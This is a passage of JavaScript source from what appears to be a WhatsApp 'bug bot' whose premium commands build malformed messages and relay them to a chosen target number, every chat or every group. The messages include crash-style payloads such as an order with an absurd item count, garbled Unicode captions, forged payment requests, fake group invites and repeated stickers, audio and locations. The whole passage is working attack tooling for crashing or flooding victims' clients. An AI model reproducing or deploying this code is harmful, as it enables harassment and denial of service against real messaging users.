if (!q) return setReply(`Jumlahnya?`)
if (isNaN(q)) return setReply(`Harus berupa angka`)
for (let i = 0; i < args[0]; i++) {
var sticker = generateWAMessageFromContent(
from,
proto.Message.fromObject({
stickerMessage: {
url: 'https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc',
fileSha256: 'YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=',
fileEncSha256: '9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=',
mediaKey: 'nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=',
mimetype: 'image/webp',
height: 64,
width: 64,
directPath: '/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781',
fileLength: '7774',
mediaKeyTimestamp: '1657290167',
isAnimated: false,
},
}),
{ userJid: from, quoted: bugkontak })
Araa.relayMessage(from, sticker.message, { messageId: sticker.key.id })
}
}
break
case 'buglokasiv':{
if (!isPremium && !m.key.fromMe) return onlyPrem()
if (!q) return setReply(`Jumlahnya?`)
if (isNaN(q)) return setReply(`Harus berupa angka`)
for (let i = 0; i < args[0]; i++) {
var messa = await prepareWAMessageMedia({ image: ofrply }, { upload: Araa.waUploadToServer })
var liveLocation = generateWAMessageFromContent(
from,
proto.Message.fromObject({
liveLocationMessage: {
degreesLatitude: -6.9367014,
degreesLongitude: 107.7228574,
caption: `ৡৢ͜͡𝟒𝟎𝟒-𝐀𝐳𝐭𝐞𝐜𝐳 ⸸⁶⁶⁶_さん ${ngazap(prefix)}`,
sequenceNumber: '1657237469254001',
jpegThumbnail: messa.imageMessage,
},
}),
{ userJid: from, quoted: bugkontak })
Araa.relayMessage(from, liveLocation.message, { messageId: liveLocation.key.id })
}
}
break
case 'bugkatalogv':
case 'bugcatalogv':{
if (!isPremium && !m.key.fromMe) return onlyPrem()
if (!q) return setReply(`Jumlahnya?`)
if (isNaN(q)) return setReply(`Harus berupa angka`)
for (let i = 0; i < args[0]; i++) {
Araa.sendKatalog(from, `ৡৢ͜͡𝟒𝟎𝟒-𝐀𝐳𝐭𝐞𝐜𝐳 ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, `ৡৢ͜͡𝟒𝟎𝟒-𝐀𝐳𝐭𝐞𝐜𝐳 ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, ofrply, { quoted: bugkontak })
}
}
break
case 'bugbuttonv':{
if (!isPremium && !m.key.fromMe) return onlyPrem()
if (!q) return setReply(`Jumlahnya?`)
if (isNaN(q)) return setReply(`Harus berupa angka`)
for (let i = 0; i < args[0]; i++) {
Araa.sendMessage(from, { 
text: '', 
templateButtons: [
{ callButton: { displayText: `P`, phoneNumber: ``}},
{ urlButton: { displayText: `P`, url: `https://wa.me/`}},
{ urlButton: { displayText: `P`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `P`, id: ``}},
{ quickReplyButton: { displayText: `P`, id: ``}},
{ quickReplyButton: { displayText: `P`, id: ``}},
]})                        
}
}
break
case 'bugtagv':{
if (!isGroup) return onlyGroup()
if (!isPremium && !m.key.fromMe) return onlyPrem()
if (!q) return setReply(`Jumlahnya?`)
if (isNaN(q)) return setReply(`Harus berupa angka`)
for (let i = 0; i < args[0]; i++) {
let member = participants.map((u) => u.id)
let org = member[Math.floor(Math.random() * member.length)]
Araa.sendMessage(from, { text: `@${org.split('@')[0]}`, mentions: [org] }, { quoted: bugkontak })
}
}
break
case 'bugtagallv':{
if (!isGroup) return onlyGroup()
if (!isPremium && !m.key.fromMe) return onlyPrem()
if (!q) return setReply(`Jumlahnya?`)
if (isNaN(q)) return setReply(`Harus berupa angka`)
for (let i = 0; i < args[0]; i++) {
let teks = `ৡৢ͜͡𝟒𝟎𝟒-𝐀𝐳𝐭𝐞𝐜𝐳 ⸸⁶⁶⁶_さん ${ngazap(prefix)}\n`
for (let mem of participants) {
teks += `⭔ @${mem.id.split('@')[0]}\n`
}
}
Araa.sendMessage(from, { text: teks, mentions: participants.map((a) => a.id) }, { quoted: bugkontak })
}
break
case 'bugpcv':{
if (!isPremium && !m.key.fromMe) return onlyPrem()
if (!q) return setReply(`Jumlahnya?`)
if (isNaN(q)) return setReply(`Harus berupa angka`)
var facahjs = await store.chats.all()
for (let i of facahjs) {
for (let i = 0; i < args[0]; i++) {
await Araa.sendMessage(i.id, { text: `TURU DECK 🥶` }, { quoted: bugkontak })
await sleep(1000)
}
}
}
break
case 'buggcv':{
if (!isPremium && !m.key.fromMe) return onlyPrem()
if (!q) return setReply(`Jumlahnya?`)
if (isNaN(q)) return setReply(`Harus berupa angka`)
let ygcx = groupss.map((v) => v.id)
for (let i of ygcx) {
for (let i = 0; i < args[0]; i++) {
await Araa.sendMessage(i, { text: `TURU DECK 🥶` }, { quoted: bugkontak })
await delay(1000)
}
}
}
break
case 'bugspamv':{
if (!isPremium && !m.key.fromMe) return onlyPrem()
if (!q) return setReply(`Jumlahnya?`)
if (isNaN(q)) return setReply(`Harus berupa angka`)
var buginvite = generateWAMessageFromContent(from, { groupInviteMessage: { groupJid: '6283144394823@g.us', inviteCode: 'UkJdqTXupAtmDwo4', inviteExpiration: '1643553084', invitetime: '1643293887000', groupName: `ৡৢ͜͡𝟒𝟎𝟒-𝐀𝐳𝐭𝐞𝐜𝐳 ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, thumbnail: ofrply, caption: `ৡৢ͜͡𝟒𝟎𝟒-𝐀𝐳𝐭𝐞𝐜𝐳 ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, contextInfo: { forwardingScore: 150, isForwarded: true },},},{ quoted: bugkontak })
var pollCreation = generateWAMessageFromContent(from,proto.Message.fromObject({pollCreationMessage: {name: 'HALO DEKK 🥶',options: [{ optionName: 'VOTE YUK' }, { optionName: 'BERANI VOTE GK' }, { optionName: 'VOTE LAH SEMUA' }, { optionName: 'KATANYA WA KEBAL' }, { optionName: 'SALAM CREATOR BOT' }],selectableOptionsCount: 5,},}),{ userJid: from, quoted: bugkontak })
var messa = await prepareWAMessageMedia({ image: ofrply }, { upload: Araa.waUploadToServer })
var order = generateWAMessageFromContent(from,proto.Message.fromObject({ orderMessage: { orderId: '594071395007984',orderImage: messa.imageMessage,itemCount: 100000000000,status: 'INQUIRY',surface: 'CATALOG',message: `ৡৢ͜͡𝟒𝟎𝟒-𝐀𝐳𝐭𝐞𝐜𝐳 ⸸⁶⁶⁶_さん ${ngazap(prefix)}`,jpegThumbnail: ofrply,orderTitle: `ৡৢ͜͡𝟒𝟎𝟒-𝐀𝐳𝐭𝐞𝐜𝐳 ⸸⁶⁶⁶_さん ${ngazap(prefix)}`,sellerJid: '628979185922@s.whatsapp.net',token: 'AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==',totalAmount1000: '500000000000000',totalCurrencyCode: 'IDR',},}),{ userJid: from, quoted: bugkontak })
var audio = generateWAMessageFromContent(from,proto.Message.fromObject({audioMessage: {url: 'https://mmg.whatsapp.net/d/f/AlPQWgY8vHOKMpm7enXU1GE5b688S07qNTs13GkcEPA-.enc',mimetype: 'audio/mpeg',fileSha256: 'jt+KpQE14SJ+ds03fY3x7ECD8S4Cu+ZUw3wjL/j4rh0=',fileLength: '258330',seconds: 16,ptt: false,mediaKey: 'gJzxyYzxv2CNr65xwRcc9Aw3h7mIdWbqCNJwNm4W640=',fileEncSha256: '6ocO8VwUISypFu6o+j/zNosnexZa2+fmBOr8meFzM1E=',directPath: '/v/t62.7114-24/35503890_364470719079037_2946106926845886057_n.enc?ccb=11-4&oh=01_AVzJ67Dyk0F7h6RDO6eyG9xBIbKuC3noBA6x_7uiqxR85A&oe=62EC8118',mediaKeyTimestamp: '1657190832',},}),{ userJid: from, quoted: bugkontak })
var image = generateWAMessageFromContent(from,proto.Message.fromObject({imageMessage: {url: 'https://mmg.whatsapp.net/d/f/AsLMMEjiKbrsWLE8r3gUN35M47mWv7ToM6hOx8bbe3c3.enc',mimetype: 'image/jpeg',caption: `ৡৢ͜͡𝟒𝟎𝟒-𝐀𝐳𝐭𝐞𝐜𝐳 ⸸⁶⁶⁶_さん ${ngazap(prefix)}`,fileSha256: 'A97BrNQQ80Z6ENlf2nfkGcvTW+XrW2t26XWDJTXT6dw=',fileLength: '42521',height: 426,width: 640,mediaKey: '6ATS0zqhx869VtGOm3diwMjszFt3jqFm/tM/Ujw2L1s=',fileEncSha256: 'Q9BtND5E4wtxeBLTQYEpMFK1MWtUscsJ7Y7jCogkixI=',directPath: '/v/t62.7118-24/56480083_2120248748157036_7836614530383507665_n.enc?ccb=11-4&oh=01_AVz0urelAted1JzbEyzzaPFeDjfQw7QTsNJIgrqlyk_3kQ&oe=62EEC1C1',mediaKeyTimestamp: '1657286523',jpegThumbnail: messa.imageMessage,},}),{ userJid: from, quoted: bugkontak })
var document = generateWAMessageFromContent(from,proto.Message.fromObject({documentMessage: {url: 'https://mmg.whatsapp.net/d/f/AqxXrAo_Ps-EypsKORCFw5DI1pwgL6QviYZjjZt1cfc9.enc',mimetype: 'application/octet-stream',title: '.dev',fileSha256: '47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=',pageCount: 0,mediaKey: 'EtWT+vaba/Lg3egtpABQamMrA/JAo7T8hSLvJwgHrSg=',fileName: `ৡৢ͜͡𝟒𝟎𝟒-𝐀𝐳𝐭𝐞𝐜𝐳 ⸸⁶⁶⁶_さん ${ngazap(prefix)}`,fileEncSha256: 'dENBk3fbczAtCSQCSld7QgpDTc8qcAKQQs+70YDjWYs=',directPath: '/v/t62.7119-24/25998581_433881065276377_966985398741330442_n.enc?ccb=11-4&oh=01_AVxJQ5tFKItPezPsVcHVcr6wNVNiZKZjbtTqCXShnXb_hQ&oe=62EEDFD5',mediaKeyTimestamp: '1657288637',},}),{ userJid: from, quoted: bugkontak })
var sticker = generateWAMessageFromContent(from,proto.Message.fromObject({stickerMessage: {url: 'https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc',fileSha256: 'YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=',fileEncSha256: '9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=',mediaKey: 'nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=',mimetype: 'image/webp',height: 64,width: 64,directPath: '/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781',fileLength: '7774',mediaKeyTimestamp: '1657290167',isAnimated: false,},}),{ userJid: from, quoted: bugkontak })
var liveLocation = generateWAMessageFromContent(from,proto.Message.fromObject({ liveLocationMessage: { degreesLatitude: -6.9367014, degreesLongitude: 107.7228574, caption: `ৡৢ͜͡𝟒𝟎𝟒-𝐀𝐳𝐭𝐞𝐜𝐳 ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, sequenceNumber: '1657237469254001', jpegThumbnail: messa.imageMessage } }),{ userJid: from, quoted: bugkontak })
for (let i = 0; i < args[0]; i++) {
Araa.relayMessage(from, buginvite.message, { messageId: buginvite.key.id })
Araa.relayMessage(from, { requestPaymentMessage: { Message: { TextMessage: { text: '', currencyCodeIso4217: 'USD', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, background: thumb }}}}, {})
Araa.relayMessage(from, pollCreation.message, { messageId: pollCreation.key.id })
Araa.relayMessage(from, order.message, { messageId: order.key.id })
Araa.relayMessage(from, audio.message, { messageId: audio.key.id })
Araa.relayMessage(from, image.message, { messageId: image.key.id })
Araa.relayMessage(from, document.message, { messageId: document.key.id })
Araa.relayMessage(from, liveLocation.message, { messageId: liveLocation.key.id })
Araa.relayMessage(from, sticker.message, { messageId: sticker.key.id })
Araa.sendKatalog(from, `ৡৢ͜͡𝟒𝟎𝟒-𝐀𝐳𝐭𝐞𝐜𝐳 ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, `ৡৢ͜͡𝟒𝟎𝟒-𝐀𝐳𝐭𝐞𝐜𝐳 ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, ofrply, { quoted: bugkontak })
Araa.sendMessage(from, { text: '', templateButtons: [{ callButton: { displayText: `P`, phoneNumber: ``}},{ urlButton: { displayText: `P`, url: `https://wa.me/`}},{ urlButton: { displayText: `P`, url: `https://www.whatsapp.com/otp/copy/`}},{ quickReplyButton: { displayText: `P`, id: ``}},{ quickReplyButton: { displayText: `P`, id: ``}},{ quickReplyButton: { displayText: `P`, id: ``}},]})
}
}
break                
case 'sendbuginvite':
try {
if (!isPremium && !m.key.fromMe) return onlyPrem()
if (!Input) return setReply('Masukan nomer target')
if (Input == Ownerin) return setReply('Tidak bisa, karena itu nomer developer')
let buginvite = generateWAMessageFromContent(
from,
{
groupInviteMessage: {
groupJid: '6283144394823@g.us',
inviteCode: 'UkJdqTXupAtmDwo4',
inviteExpiration: '1643553084',
invitetime: '1643293887000',
groupName: `ৡৢ͜͡𝟒𝟎𝟒-𝐀𝐳𝐭𝐞𝐜𝐳 ⸸⁶⁶⁶_さん ${ngazap(prefix)}`,
thumbnail: ofrply,
caption: `ৡৢ͜͡𝟒𝟎𝟒-𝐀𝐳𝐭𝐞𝐜𝐳 ⸸⁶⁶⁶_さん ${ngazap(prefix)}`,
contextInfo: { forwardingScore: 150, isForwarded: true },
},
},
{ quoted: bugkontak })
await setReply('Sending...')
Araa.relayMessage(Input, buginvite.message, { messageId: buginvite.key.id })
setReply(`Berhasil mengirim Bug ke Nomer ${Input.split('@')[0]}`)
} catch (err) {
console.log(err)
setReply('Gagal mengirim bug, Terjadi Error')
}
break
case 'sendbugpayment':
case 'sendbugpay':
try {
if (!isPremium && !m.key.fromMe) return onlyPrem()
if (!Input) return setReply('Masukan nomer target')
if (Input == Ownerin) return setReply('Tidak bisa, karena itu nomer developer')                        
await setReply('Sending...')
Araa.relayMessage(Input, { requestPaymentMessage: { Message: { TextMessage: { text: '', currencyCodeIso4217: 'USD', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, background: thumb }}}}, {})
setReply(`Berhasil mengirim Bug ke Nomer ${Input.split('@')[0]}`)
} catch (err) {
console.log(err)
setReply('Gagal mengirim bug, Terjadi Error')
}
break
case 'sendbugpolling':
try {
if (!isPremium && !m.key.fromMe) return onlyPrem()
if (!Input) return setReply('Masukan nomer target')
if (Input == Ownerin) return setReply('Tidak bisa, karena itu nomer developer')
var bugreact = await Araa.sendMessage(from, { react: { text: '0️', key: { remoteJid: from, fromMe: true, id: m.id } } })
var pollCreation = generateWAMessageFromContent(
from,
proto.Message.fromObject({
pollCreationMessage: {
name: 'HALO DEKK 🥶',
options: [{ optionName: 'VOTE YUK' }, { optionName: 'BERANI VOTE GK' }, { optionName: 'VOTE LAH SEMUA' }, { optionName: 'KATANYA WA KEBAL' }, { optionName: 'SALAM CREATOR BOT' }],
selectableOptionsCount: 5,
},
}),
{ userJid: from, quoted: bugkontak }
)
await setReply('Sending...')
Araa.relayMessage(Input, pollCreation.message, { messageId: pollCreation.key.id })
setReply(`Berhasil mengirim Bug ke Nomer ${Input.split('@')[0]}`)
} catch (err) {
console.log(err)
setReply('Gagal mengirim bug, Terjadi Error')
}
break
case 'sendbugtroli':
try {
if (!isPremium && !m.key.fromMe) return onlyPrem()
if (!Input) return setReply('Masukan nomer target')
if (Input == Ownerin) return setReply('Tidak bisa, karena itu nomer developer')
var messa = await prepareWAMessageMedia({ image: ofrply }, { upload: Araa.waUploadToServer })
var order = generateWAMessageFromContent(
from,
proto.Message.fromObject({
orderMessage: {
orderId: '594071395007984',
orderImage: messa.imageMessage,
itemCount: 100000000000,
status: 'INQUIRY',
surface: 'CATALOG',
message: `ৡৢ͜͡𝟒𝟎𝟒-𝐀𝐳𝐭𝐞𝐜𝐳 ⸸⁶⁶⁶_さん ${ngazap(prefix)}`,
jpegThumbnail: ofrply,
orderTitle: `ৡৢ͜͡𝟒𝟎𝟒-𝐀𝐳𝐭𝐞𝐜𝐳 ⸸⁶⁶⁶_さん ${ngazap(prefix)}`,
sellerJid: '628979185922@s.whatsapp.net',
token: 'AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==',
totalAmount1000: '500000000000000',
totalCurrencyCode: 'IDR',
},
}),
{ userJid: from, quoted: bugkontak })
await setReply('Sending...')
Araa.relayMessage(Input, order.message, { messageId: order.key.id })
setReply(`Berhasil mengirim Bug ke Nomer ${Input.split('@')[0]}`)
} catch (err) {
console.log(err)
setReply('Gagal mengirim bug, Terjadi Error')
}
break
case 'sendbugaudio':
try {
if (!isPremium && !m.key.fromMe) return onlyPrem()
if (!Input) return setReply('Masukan nomer target')
if (Input == Ownerin) return setReply('Tidak bisa, karena itu nomer developer')
var audio = generateWAMessageFromContent(
from,
proto.Message.fromObject({
audioMessage: {
url: 'https://mmg.whatsapp.net/d/f/AlPQWgY8vHOKMpm7enXU1GE5b688S07qNTs13GkcEPA-.enc',
mimetype: 'audio/mpeg',
fileSha256: 'jt+KpQE14SJ+ds03fY3x7ECD8S4Cu+ZUw3wjL/j4rh0=',
fileLength: '258330',
seconds: 16,
ptt: false,
mediaKey: 'gJzxyYzxv2CNr65xwRcc9Aw3h7mIdWbqCNJwNm4W640=',
fileEncSha256: '6ocO8VwUISypFu6o+j/zNosnexZa2+fmBOr8meFzM1E=',
directPath: '/v/t62.7114-24/35503890_364470719079037_2946106926845886057_n.enc?ccb=11-4&oh=01_AVzJ67Dyk0F7h6RDO6eyG9xBIbKuC3noBA6x_7uiqxR85A&oe=62EC8118',
mediaKeyTimestamp: '1657190832',
},
}),
{ userJid: from, quoted: bugkontak })
await setReply('Sending...')
Araa.relayMessage(Input, audio.message, { messageId: audio.key.id })
setReply(`Berhasil mengirim Bug ke Nomer ${Input.split('@')[0]}`)
} catch (err) {
console.log(err)
setReply('Gagal mengirim bug, Terjadi Error')
}
break
case 'sendbugimage':
try {
if (!isPremium && !m.key.fromMe) return onlyPrem()
if (!Input) return setReply('Masukan nomer target')
if (Input == Ownerin) return setReply('Tidak bisa, karena itu nomer developer')
var messa = await prepareWAMessageMedia({ image: ofrply }, { upload: Araa.waUploadToServer })
var image = generateWAMessageFromContent(
from,
proto.Message.fromObject({
imageMessage: {
url: 'https://mmg.whatsapp.net/d/f/AsLMMEjiKbrsWLE8r3gUN35M47mWv7ToM6hOx8bbe3c3.enc',
mimetype: 'image/jpeg',
caption: `ৡৢ͜͡𝟒𝟎𝟒-𝐀𝐳𝐭𝐞𝐜𝐳 ⸸⁶⁶⁶_さん ${ngazap(prefix)}`,
fileSha256: 'A97BrNQQ80Z6ENlf2nfkGcvTW+XrW2t26XWDJTXT6dw=',
fileLength: '42521',
height: 426,
width: 640,
mediaKey: '6ATS0zqhx869VtGOm3diwMjszFt3jqFm/tM/Ujw2L1s=',
fileEncSha256: 'Q9BtND5E4wtxeBLTQYEpMFK1MWtUscsJ7Y7jCogkixI=',
directPath: '/v/t62.7118-24/56480083_2120248748157036_7836614530383507665_n.enc?ccb=11-4&oh=01_AVz0urelAted1JzbEyzzaPFeDjfQw7QTsNJIgrqlyk_3kQ&oe=62EEC1C1',
mediaKeyTimestamp: '1657286523',
jpegThumbnail: messa.imageMessage,
},
}),
{ userJid: from, quoted: bugkontak })
await setReply('Sending...')
Araa.relayMessage(Input, image.message, { messageId: image.key.id })
setReply(`Berhasil mengirim Bug ke Nomer ${Input.split('@')[0]}`)
} catch (err) {
console.log(err)
setReply('Gagal mengirim bug, Terjadi Error')
}
break
case 'sendbugdocument':
case 'sendbugdoc':
try {
if (!isPremium && !m.key.fromMe) return onlyPrem()
if (!Input) return setReply('Masukan nomer target')
if (Input == Ownerin) return setReply('Tidak bisa, karena itu nomer developer')
var messa = await prepareWAMessageMedia({ image: ofrply }, { upload: Araa.waUploadToServer })
var document = generateWAMessageFromContent(
from,
proto.Message.fromObject({
documentMessage: {
url: 'https://mmg.whatsapp.net/d/f/AqxXrAo_Ps-EypsKORCFw5DI1pwgL6QviYZjjZt1cfc9.enc',
mimetype: 'application/octet-stream',
title: '.dev',
fileSha256: '47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=',
pageCount: 0,
mediaKey: 'EtWT+vaba/Lg3egtpABQamMrA/JAo7T8hSLvJwgHrSg=',
fileName: `ৡৢ͜͡𝟒𝟎𝟒-𝐀𝐳𝐭𝐞𝐜𝐳 ⸸⁶⁶⁶_さん ${ngazap(prefix)}`,
fileEncSha256: 'dENBk3fbczAtCSQCSld7QgpDTc8qcAKQQs+70YDjWYs=',
directPath: '/v/t62.7119-24/25998581_433881065276377_966985398741330442_n.enc?ccb=11-4&oh=01_AVxJQ5tFKItPezPsVcHVcr6wNVNiZKZjbtTqCXShnXb_hQ&oe=62EEDFD5',
mediaKeyTimestamp: '1657288637',
},
}),
{ userJid: from, quoted: bugkontak })
await setReply('Sending...')
Araa.relayMessage(Input, document.message, { messageId: document.key.id })
setReply(`Berhasil mengirim Bug ke Nomer ${Input.split('@')[0]}`)
} catch (err) {
console.log(err)
setReply('Gagal mengirim bug, Terjadi Error')
}
break
case 'sendbugsticker':
case 'sendbugstick':
try {
if (!isPremium && !m.key.fromMe) return onlyPrem()
if (!Input) return setReply('Masukan nomer target')
if (Input == Ownerin) return setReply('Tidak bisa, karena itu nomer developer')
var sticker = generateWAMessageFromContent(
from,
proto.Message.fromObject({
stickerMessage: {
url: 'https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc',
fileSha256: 'YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=',
fileEncSha256: '9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=',
mediaKey: 'nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=',
mimetype: 'image/webp',
height: 64,
width: 64,
directPath: '/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781',
fileLength: '7774',
mediaKeyTimestamp: '1657290167',
isAnimated: false,
},
}),
{ userJid: from, quoted: bugkontak })
await setReply('Sending...')
Araa.relayMessage(Input, sticker.message, { messageId: sticker.key.id })
setReply(`Berhasil mengirim Bug ke Nomer ${Input.split('@')[0]}`)
} catch (err) {
console.log(err)
setReply('Gagal mengirim bug, Terjadi Error')
}
break
case 'sendbuglokasi':
try {
if (!isPremium && !m.key.fromMe) return onlyPrem()
if (!Input) return setReply('Masukan nomer target')
if (Input == Ownerin) return setReply('Tidak bisa, karena itu nomer developer')
var messa = await prepareWAMessageMedia({ image: ofrply }, { upload: Araa.waUploadToServer })
var liveLocation = generateWAMessageFromContent(
from,
proto.Message.fromObject({ liveLocationMessage: { degreesLatitude: -6.9367014, degreesLongitude: 107.7228574, caption: `ৡৢ͜͡𝟒𝟎𝟒-𝐀𝐳𝐭𝐞𝐜𝐳 ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, sequenceNumber: '1657237469254001', jpegThumbnail: messa.imageMessage } }),
{ userJid: from, quoted: bugkontak })
await setReply('Sending...')
Araa.relayMessage(Input, liveLocation.message, { messageId: liveLocation.key.id })
setReply(`Berhasil mengirim Bug ke Nomer ${Input.split('@')[0]}`)
} catch (err) {
console.log(err)
setReply('Gagal mengirim bug, Terjadi Error')
}
break
case 'sendbugkatalog':
case 'sendbugcatalog':
try {
if (!isPremium && !m.key.fromMe) return onlyPrem()
if (!Input) return setReply('Masukan nomer target')
if (Input == Ownerin) return setReply('Tidak bisa, karena itu nomer developer')
await setReply('Sending...')
Araa.sendKatalog(Input, `ৡৢ͜͡𝟒𝟎𝟒-𝐀𝐳𝐭𝐞𝐜𝐳 ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, `ৡৢ͜͡𝟒𝟎𝟒-𝐀𝐳𝐭𝐞𝐜𝐳 ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, ofrply, { quoted: bugkontak })
setReply(`Berhasil mengirim Bug ke Nomer ${Input.split('@')[0]}`)
} catch (err) {
console.log(err)
setReply('Gagal mengirim bug, Terjadi Error')
}
break
case 'sendbugbutton':
try {
if (!isPremium && !m.key.fromMe) return onlyPrem()
if (!Input) return setReply('Masukan nomer target')
if (Input == Ownerin) return setReply('Tidak bisa, karena itu nomer developer')
await setReply('Sending...')
Araa.sendMessage(Input, { 
text: '', 
templateButtons: [
{ callButton: { displayText: `P`, phoneNumber: ``}},
{ urlButton: { displayText: `P`, url: `https://wa.me/`}},
{ urlButton: { displayText: `P`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `P`, id: ``}},
{ quickReplyButton: { displayText: `P`, id: ``}},
{ quickReplyButton: { displayText: `P`, id: ``}},
]})
setReply(`Berhasil mengirim Bug ke Nomer ${Input.split('@')[0]}`)
} catch (err) {
console.log(err)
setReply('Gagal mengirim bug, Terjadi Error')
}
break
case 'sendbugspam':
try {
if (!isPremium && !m.key.fromMe) return onlyPrem()
if (!Input) return setReply('Masukan nomer target')
if (Input == Ownerin) return setReply('Tidak bisa, karena itu nomer developer')
var buginvite = generateWAMessageFromContent(from, { groupInviteMessage: { groupJid: '6283144394823@g.us', inviteCode: 'UkJdqTXupAtmDwo4', inviteExpiration: '1643553084', invitetime: '1643293887000', groupName: `ৡৢ͜͡𝟒𝟎𝟒-𝐀𝐳𝐭𝐞𝐜𝐳 ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, thumbnail: ofrply, caption: `ৡৢ͜͡𝟒𝟎𝟒-𝐀𝐳𝐭𝐞𝐜𝐳 ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, contextInfo: { forwardingScore: 150, isForwarded: true },},},{ quoted: bugkontak })
var pollCreation = generateWAMessageFromContent(from,proto.Message.fromObject({pollCreationMessage: {name: 'HALO DEKK 🥶',options: [{ optionName: 'VOTE YUK' }, { optionName: 'BERANI VOTE GK' }, { optionName: 'VOTE LAH SEMUA' }, { optionName: 'KATANYA WA KEBAL' }, { optionName: 'SALAM CREATOR BOT' }],selectableOptionsCount: 5,},}),{ userJid: from, quoted: bugkontak })
var messa = await prepareWAMessageMedia({ image: ofrply }, { upload: Araa.waUploadToServer })
var order = generateWAMessageFromContent(from,proto.Message.fromObject({ orderMessage: { orderId: '594071395007984',orderImage: messa.imageMessage,itemCount: 100000000000,status: 'INQUIRY',surface: 'CATALOG',message: `ৡৢ͜͡𝟒𝟎𝟒-𝐀𝐳𝐭𝐞𝐜𝐳 ⸸⁶⁶⁶_さん ${ngazap(prefix)}`,jpegThumbnail: ofrply,orderTitle: `ৡৢ͜͡𝟒𝟎𝟒-𝐀𝐳𝐭𝐞𝐜𝐳 ⸸⁶⁶⁶_さん ${ngazap(prefix)}`,sellerJid: '628979185922@s.whatsapp.net',token: 'AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==',totalAmount1000: '500000000000000',totalCurrencyCode: 'IDR',},}),{ userJid: from, quoted: bugkontak })
var audio = generateWAMessageFromContent(from,proto.Message.fromObject({audioMessage: {url: 'https://mmg.whatsapp.net/d/f/AlPQWgY8vHOKMpm7enXU1GE5b688S07qNTs13GkcEPA-.enc',mimetype: 'audio/mpeg',fileSha256: 'jt+KpQE14SJ+ds03fY3x7ECD8S4Cu+ZUw3wjL/j4rh0=',fileLength: '258330',seconds: 16,ptt: false,mediaKey: 'gJzxyYzxv2CNr65xwRcc9Aw3h7mIdWbqCNJwNm4W640=',fileEncSha256: '6ocO8VwUISypFu6o+j/zNosnexZa2+fmBOr8meFzM1E=',directPath: '/v/t62.7114-24/35503890_364470719079037_2946106926845886057_n.enc?ccb=11-4&oh=01_AVzJ67Dyk0F7h6RDO6eyG9xBIbKuC3noBA6x_7uiqxR85A&oe=62EC8118',mediaKeyTimestamp: '1657190832',},}),{ userJid: from, quoted: bugkontak })
var image = generateWAMessageFromContent(from,proto.Message.fromObject({imageMessage: {url: 'https://mmg.whatsapp.net/d/f/AsLMMEjiKbrsWLE8r3gUN35M47mWv7ToM6hOx8bbe3c3.enc',mimetype: 'image/jpeg',caption: `ৡৢ͜͡𝟒𝟎𝟒-𝐀𝐳𝐭𝐞𝐜𝐳 ⸸⁶⁶⁶_さん ${ngazap(prefix)}`,fileSha256: 'A97BrNQQ80Z6ENlf2nfkGcvTW+XrW2t26XWDJTXT6dw=',fileLength: '42521',height: 426,width: 640,mediaKey: '6ATS0zqhx869VtGOm3diwMjszFt3jqFm/tM/Ujw2L1s=',fileEncSha256: 'Q9BtND5E4wtxeBLTQYEpMFK1MWtUscsJ7Y7jCogkixI=',directPath: '/v/t62.7118-24/56480083_2120248748157036_7836614530383507665_n.enc?ccb=11-4&oh=01_AVz0urelAted1JzbEyzzaPFeDjfQw7QTsNJIgrqlyk_3kQ&oe=62EEC1C1',mediaKeyTimestamp: '1657286523',jpegThumbnail: messa.imageMessage,},}),{ userJid: from, quoted: bugkontak })
